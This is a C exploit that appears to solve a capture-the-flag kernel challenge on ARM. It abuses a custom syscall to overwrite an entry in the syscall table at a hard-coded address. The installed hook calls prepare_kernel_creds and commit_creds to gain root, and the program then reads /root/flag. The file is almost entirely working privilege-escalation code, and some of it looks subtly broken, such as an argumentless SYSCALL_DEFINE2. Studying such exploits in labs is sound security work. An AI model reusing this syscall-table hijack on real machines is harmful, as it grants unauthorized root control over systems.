#include <sys/syscall.h>
#include <linux/kernel.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define EXPLOIT 222
#define SYS_UPPER 223
#define SYS_CALL_TABLE 0x8000e348

long commit_creds = 0x8003f56c;
long prepare_kernel_creds = 0x8003f924;

SYSCALL_DEFINE2() {
    // volatile keyword idicates that the instuctions has important side-effects.
    asm volatile (
        "eor r0, r0\n"
        "bl prepare_kernel_creds\n"
        "bl commit_creds\n"
    );
    return 0;  
}

int main(int argc, char *argv[]) {
    unsigned int** syscall_table = (unsigned int**)SYS_CALL_TABLE;
    char *entry_value = "\x89\x01\x03\x01";
    int hook_address = 0;
    
    // overwrite an empty syscall
    syscall(SYS_UPPER, entry_value, &syscall_table[EXPLOIT]);
    syscall(SYS_UPPER, &syscall_table[EXPLOIT], (char *)&hook_address);
    printf("[*] hook address: %p\n", (int *)hook_address);

    // triger hook and elevate privileges
    syscall(EXPLOIT);

    system("/bin/cat /root/flag");
    return 0;
}

/* 
gcc -Wl,--section-start=.text=0x1030110 sol.c -o sol
*/